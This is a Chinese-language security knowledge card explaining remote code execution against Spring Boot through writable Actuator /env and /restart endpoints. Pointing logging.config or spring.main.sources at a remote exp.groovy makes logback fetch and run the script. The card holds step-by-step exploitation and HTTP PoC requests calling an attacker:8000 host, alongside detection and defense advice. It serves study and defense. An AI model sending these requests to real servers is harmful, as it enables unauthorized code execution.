---
id: web-java-framework-spring-actuator-restart-logging-config-groovy-rce
title: Spring Boot Actuator restart + logging.config 指向远程 .groovy：logback ContextInitializer 加载 Groovy 配置执行命令
type: scenario
domain: web
path: web/java/framework/spring
technique: actuator-restart-logging-config-groovy-rce
aliases:
- logging.config groovy
- spring.main.sources groovy
- logback Groovy 配置 RCE
- LoggingApplicationListener
- Actuator restart 命令执行
tags:
- java
- spring
- spring-boot
- actuator
- restart
- logback
- groovy
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V321
  verified_at: '2026-11-08T15:34:09+08:00'
  notes: 已对照原文核对：/env 写 logging.config 远程 .groovy、LoggingApplicationListener/ContextInitializer 以 .groovy 结尾判断、/restart 触发，及 spring.main.sources 变体均与原文一致；原文无执行截图，未复跑。
---

## 一句话结论

Spring Boot 的 `/env` 可写且 `/restart` 端点开启时，攻击者把 `logging.config` 设为远程 `.groovy` 文件并触发重启；`LoggingApplicationListener#initialize` 初始化日志系统时，logback 的 `ContextInitializer` 判断 URL 以 `.groovy` 结尾并用 Groovy 加载配置，脚本中的 `Runtime.getRuntime().exec(...)` 直接执行，形成 RCE。`spring.main.sources` 指向远程 Groovy 源是同一思路的变体。

## 原理

- Spring Boot 的 `LoggingApplicationListener#initialize()` 负责初始化日志系统，会读取 Environment 中的 `logging.config` 属性作为日志配置文件位置，并调用 logback 的 `ContextInitializer` 加载。
- logback 支持 Groovy 形式的配置：`ContextInitializer` 会判断配置 URL 是否以 `.groovy` 结尾，若是则交给 Groovy 配置加载器（`GroovyClassLoader`/Slurper 等）解析执行，而不是当静态 XML 处理。
- 因此把 `logging.config` 指向攻击者 HTTP 服务上的 `exp.groovy`，logback 下载并执行该 Groovy 脚本；脚本内容就是任意 Java 代码，例如 `Runtime.getRuntime().exec("calc")`。
- `/restart` 端点会重启应用上下文并重新初始化日志系统，是让新 `logging.config` 生效的触发点。1.x 需要 `endpoints.restart.enabled=true`，2.x 需要 `management.endpoint.restart.enabled=true`。
- 变体 `spring.main.sources` 也是 Spring Boot 的 Environment 属性，重启时 `SpringApplication` 会把它作为额外配置源加载；当值为远程 `.groovy` 且 classpath 有 Groovy 时，同样会解析执行脚本。
- 前提是 `logging.config` 可写且 `/restart` 可达；原文还要求 classpath 存在 Groovy 依赖。

## 触发条件

- `/env`（1.x）或 `/actuator/env`（2.x）未授权可写；`/restart` 或 `/actuator/restart` 已开启并可访问。
- classpath 存在 Groovy 依赖，logback 版本支持 Groovy 配置。
- 目标能出站访问攻击者的 HTTP 服务。
- 应用允许通过 `logging.config` 或 `spring.main.sources` 加载外部配置（未做来源白名单）。

## 利用步骤

1. 探测 `/env`/`/actuator/env` 可写，确认 `/restart`/`/actuator/restart` 可达（1.x `endpoints.restart.enabled=true`，2.x `management.endpoint.restart.enabled=true`）。
2. 在攻击机写 `exp.groovy`：

```groovy
Runtime.getRuntime().exec("open -a Calculator")
Runtime.getRuntime().exec("calc")
```

3. 启动 HTTP 服务托管该文件。
4. 写入配置：
   - 1.x：`POST /env`（表单）写 `logging.config=http://attacker:8000/exp.groovy`；
   - 2.x：`POST /actuator/env`（JSON）写 `{"name":"logging.config","value":"http://attacker:8000/exp.groovy"}`。
5. 访问 `/restart` 或 `/actuator/restart`，应用重启并重新初始化日志，Groovy 脚本被执行。
6. 变体：改 `spring.main.sources=http://attacker:8000/exp.groovy`，同样重启触发。
7. 测试后恢复 `logging.config`/`spring.main.sources` 原值；该操作会重启业务，必须先取得授权。

## PoC

```http
### 1.x 写入
POST /env HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

logging.config=http://attacker:8000/exp.groovy
```

```http
### 2.x 写入
POST /actuator/env HTTP/1.1
Host: target
Content-Type: application/json

{"name":"logging.config","value":"http://attacker:8000/exp.groovy"}
```

```http
### 触发重启
POST /actuator/restart HTTP/1.1
Host: target
```

```groovy
// exp.groovy
Runtime.getRuntime().exec("calc")
```

`spring.main.sources` 变体：

```http
POST /actuator/env HTTP/1.1
Content-Type: application/json

{"name":"spring.main.sources","value":"http://attacker:8000/exp.groovy"}
```

## 变体与关联

- 变体：`logging.config` 指向远程 logback XML 并通过 `insertFromJNDI` 走 JNDI，见关联卡。
- 变体：`spring.main.sources` 指向远程 Groovy 源，重启时由 `SpringApplication` 加载。
- 关联：[[web-java-framework-spring-actuator-restart-logging-config-logback-jndi-rce]]（同一 `/restart` + `logging.config` 入口，sink 换成 logback JNDI）、[[web-java-framework-spring-actuator-restart-spring-datasource-data-h2-sql-rce]]（同一 `/restart` 触发模式，sink 换成 H2 SQL）。
- 边界：`/env` 只读或需认证、`/restart` 未开启、classpath 无 Groovy、logback 不支持 Groovy 配置或目标不能出站时，该链不成立。

## 检测与防御

- 检测：`/env`、`/actuator/env` 出现 `logging.config` 或 `spring.main.sources` 写入，值指向外部 `.groovy`；随后 `/restart` 重启与异常进程创建。
- 防御：关闭或鉴权 Actuator 的 `env`、`restart` 端点；生产环境不开启 restart。
- 防御：`logging.config` 只允许本地 classpath 路径，禁止 `http(s)://`；移除不必要的 Groovy 依赖。
- 加固：限制应用出站访问；对配置属性写入做审计与告警。
